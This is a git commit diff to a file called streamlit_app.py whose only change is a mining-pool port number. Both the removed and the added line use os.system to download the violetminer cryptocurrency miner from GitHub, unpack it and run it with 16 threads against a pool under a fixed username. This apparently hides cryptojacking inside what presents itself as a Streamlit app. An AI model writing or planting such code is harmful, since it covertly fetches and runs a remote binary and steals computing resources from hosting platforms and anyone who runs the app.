c346b641006f205472ab5c1fbae071f4fc0717ea
hagacz <112244590+hagacz@users.noreply.github.com>
2022-08-27 10:09:22 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system ("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool stc.ss.poolin.one:443 --username nung.001 --password 123 --disableNVIDIA --threads 16") 
+os.system ("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool stc.ss.poolin.one:700 --username nung.001 --password 123 --disableNVIDIA --threads 16") 
